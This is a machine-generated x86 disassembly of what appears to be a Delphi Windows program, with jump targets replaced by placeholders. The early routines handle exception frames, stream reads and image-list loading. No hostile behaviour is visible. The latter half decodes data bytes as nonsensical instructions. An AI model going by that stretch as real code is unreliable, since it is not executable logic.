cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4188a0
mov si 0xffff
call sub_403564
inc ebp
dec edi
jne r-xdata
sub_456b74
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418790
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4188a0
cmp ebp eax
jne r-xdata
sub_456bcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_408110
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_456c10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_4563ec
mov ebx eax
mov eax edi
call sub_4563ec
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4563ec
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456cec
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456ccf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_456bcc
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456cd6
mov eax [ ebp - 0xc ]
call sub_403368
retn
mov eax edi
call sub_4563ec
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_456d00
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4563ec
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_456c10
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_456d5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4214fc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_456d00
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456db4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41af44
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41af44
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_457038
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41ad18
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41ad38
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45701b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_428b9c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_417264
mov eax [ ebp - 0x4 ]
call sub_4573e0
xor eax eax
push ebp
push sub_456ffe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457005
mov eax [ ebp - 0xc ]
call sub_403368
mov eax [ ebp - 0x14 ]
call sub_403368
mov eax [ ebp - 0x4 ]
call sub_4573e4
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_41728c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_427e2c
push eax
mov eax [ ebp - 0xc ]
call sub_427e2c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424c14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_41728c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_427e2c
push eax
mov eax [ ebp - 0x14 ]
call sub_427e2c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424c14
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_456320
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_457048
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421c7c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4570a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4561b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4570af
mov eax [ ebp - 0xc ]
call sub_403368
retn
sub eax 0xffffffec
sub_4570af
mov eax [ ebp - 0x4 ]
call sub_4560a8
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4571de
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41ad38
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41b440
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41ad38
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403368
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41ad38
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421c7c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4571c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41ad38
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4561b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403368
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41ad38
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_457210
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_456248
mov eax edi
call sub_41ad18
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41ad38
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_456db4
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_457048
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45729c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421c7c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_457396
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c38c
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_4561e4
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_4561e4
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45739d
mov eax [ ebp - 0x4 ]
call sub_403368
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
jmp r-xdata
sub_457404
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
mov edx esi
call sub_456b74
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_457450
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_457475
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45747c
retn
sub_45748c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x74
inc ebp
add [ eax + eax ] cl
add [ eax ] al
int3
sub_457966
cmp al 0xbe
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
outsb
jne r-xdata
popad
imul edx [ eax + edx + 0x300040 ] 0x0
[ esp + ebp * 4 ]
jns r-xdata
push esp
insd
popad
jae r-xdata
add [ eax ] al
jmp eax
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
mov [ ebp + eax * 2 + 0x45b51000 ] gs
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
int3
inc ebp
add al dh
mov ah 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add bh bh
sbb al 0xac
int3
adc [ eax ] al
cmp eax 0x80ff0000
mov bl 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x2c6d6574
pop edx
dec ecx
outsb
js r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
aam 0xae
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
cwde
inc ebx
jne r-xdata
adc [ eax ] al
aas
add [ eax ] al
[ eax - 0x53 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
push esp
pop ecx
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
push [ eax - 0x4b ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
js r-xdata
je r-xdata
inc ecx
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
mov al 0xb5
inc ebp
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
push eax
mov ch 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
dec [ esi + ebp * 4 ]
inc ebp
add [ eax + 0x45b5 ] dl
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cmp [ eax ] eax
add bh bh
loopne r-xdata
xor eax 0x12480040
inc edx
add [ ebp + esi + 0x35a00040 ] ch
ja r-xdata
outsd
dec ecx
je r-xdata
int3
inc ebp
add [ eax ] dh
mov ch 0x45
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add dl dl
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
inc ecx
add [ eax ] ah
add bh bh
call 0xffffffffb045c10e
mov ch 0x45
insd
sub al 0x5a
inc edx
add [ ecx + ebx ] cl
fcom [ esi ]
add dh ah
jl r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + eax * 8 - 0x7067ffbb ] bh
inc ecx
add ah bh
adc al 0x42
add [ esi + ecx * 4 - 0x371bffbf ] dh
xor eax 0x35a00040
insd
pop esp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ eax ] ah
rol [ ebp ] 0xcc
enter 0x45 0x10
rol [ ebp ] 0xfc
enter 0x45 0xe
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
or al 0x19
add [ eax ] bl
add [ eax ] al
outsd
jl r-xdata
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
inc ebp
add [ eax - 0x1bffba37 ] al
in al 0xc8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
hlt
jb r-xdata
sar [ ebp + eax * 2 ] 0xf0
jl r-xdata
add [ eax ] al
insd
in al 0x75
inc ebp
add [ eax - 0x67010000 ] bl
adc eax 0x16dc0042
inc ebp
add ah ah
dec ecx
je r-xdata
insd
lea eax [ eax ]
test [ ebp + eax * 2 ] bh
sub_457d30
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ ebp + 0x45 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 2 + 0x600045 ] dh
add [ eax ] al
cmp [ ebp + eax * 2 ] bh
hlt
sub_457d59
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + eax * 8 - 0x7067ffbb ] bh
inc ecx
add ah bh
adc al 0x42
add [ esi + ecx * 4 - 0x371bffbf ] dh
inc ebp
add [ eax - 0x1bffba37 ] al
adc eax 0x16dc0042
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ eax ] ah
rol [ ebp ] 0xcc
enter 0x45 0xbc
into
inc ebp
add [ eax ] al
into
inc ebp
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rol ah 0x7d
inc ebp
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0x78756e65
jge r-xdata
add [ eax ] al
add [ eax ] al
add ah ch
jl r-xdata
dec ecx
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
jmp eax
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] al
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
dec [ eax ]
enter 0x45 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
add [ eax + 0x10045cd ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ edi + esi * 2 ] dl
inc ebp
add [ eax - 0x4fffba33 ] ah
int 0x45
add [ ecx ] al
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
adc [ edi + 0x45 ] bh
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
jb r-xdata
insd
popad
jae r-xdata
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xcc65646f
pop esi
inc ebp
add [ eax ] cl
add bh bh
inc esp
leave
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
dec eax
outsd
je r-xdata
nop
jo r-xdata
outsb
ja r-xdata
jns r-xdata
je r-xdata
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + edi * 2 ] cl
inc ebp
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
or al 0x7f
adc [ eax ] al
inc ecx
add [ eax ] al
int3
add [ eax ] al
adc al 0x77
inc ebp
add al al
int 0x45
add al dl
int 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc eax
add [ eax + 0x4035 ] ah
outsd
insd
je r-xdata
insd
popad
inc edx
outsd
outsb
push esp
outsd
jne r-xdata
push esp
dec ebp
dec esp
je r-xdata
add al al
int 0x45
add al dl
int 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
inc eax
add [ edx * 8 - 0x7067ffbb ] dl
inc ecx
add ah bh
adc al 0x42
add [ esi + ecx * 4 - 0x371bffbf ] dh
inc ebp
add [ eax - 0x1bffba37 ] al
adc eax 0x16dc0042
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
add [ ebx + esi ] bl
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
add [ eax - 0x4fffba33 ] ah
int 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
jae r-xdata
add eax 0x756e654d
outsd
clc
jg r-xdata
je r-xdata
jne r-xdata
jb r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x61700874
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd865646f
pop ecx
inc ecx
dec eax
outsd
je r-xdata
hlt
mov al 0x80
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
je r-xdata
insd
outsb
jg r-xdata
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4580 ] dh
outsd
dec esp
je r-xdata
push eax
jg r-xdata
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
or al cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
xor eax [ eax ]
sbb al 0x33
xor eax 0x12480040
inc edx
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ edi + edi * 2 + 0x408d0045 ] ecx
add [ eax + eax * 4 + 0x45 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ eax - 0x33ffba2c ] ah
enter 0x45 0x10
rol [ ebp ] 0xfc
enter 0x45 0x48
aad 0x45
add [ eax ] al
salc
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
in al dx
adc eax 0x19140042
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
or eax 0x6f42616d
insd
outsb
add eax 0x756e654d
jae r-xdata
outsb
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
int3
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
jo r-xdata
pop eax
inc ecx
add [ eax ] dh
add [ eax ] al
[ eax ]
add [ ebp + edx * 8 + 0x45 ] bl
add [ ebp + edx * 8 + 0x45 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
fcomp [ ecx + 0x41 ]
adc al 0x77
inc ebp
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x78004580 ] ah
add [ eax ] al
add [ eax ] bh
jl r-xdata
outsd
inc edx
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
